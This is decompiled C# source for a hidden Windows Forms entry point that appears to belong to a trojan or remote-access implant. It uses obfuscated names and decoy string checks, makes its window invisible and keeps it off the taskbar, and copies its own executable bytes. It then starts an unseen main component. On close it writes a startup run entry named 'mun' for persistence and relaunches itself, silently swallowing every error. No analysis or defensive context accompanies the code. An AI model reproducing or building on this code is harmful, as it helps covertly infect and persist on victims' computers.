using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace camsars;

public class Form1 : Form
{
	private IContainer components = null;

	private string romwcko = "4TRE2D3GTBV|wicmxRFEDR9";

	private romwckoMCDM romwckomainvp = new romwckoMCDM();

	private byte[] fileByt = null;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowIcon(false);
			((Form)this).set_ShowInTaskbar(false);
			if (romwcko == "TGREEDF|wicmxTBRE1F2DCd")
			{
				romwcko = "EEW2DF|wicmxREDE2RF1S";
			}
			((Control)this).set_Visible(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			try
			{
				if (romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckomainApp + ".exe|wicmx".Split(new char[1] { '|' })[0] != Application.get_ExecutablePath())
				{
					fileByt = File.ReadAllBytes(Application.get_ExecutablePath());
				}
			}
			catch
			{
			}
			romwckoCONF.romwckoset_setting();
			if (romwcko == "TGREEDF|wicmxTBR1FE2DCd")
			{
				romwcko = "EW2DF|wicmxREED2RF1S";
			}
			romwckomainvp.romwckostart();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			romwckoCONF.romwckoset_run("mun|wicmx".Split(new char[1] { '|' })[0], romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckomainApp + ".exe|wicmx".Split(new char[1] { '|' })[0]);
			romwckomainvp.romwckoload_app(fileByt);
		}
		catch
		{
		}
	}
}
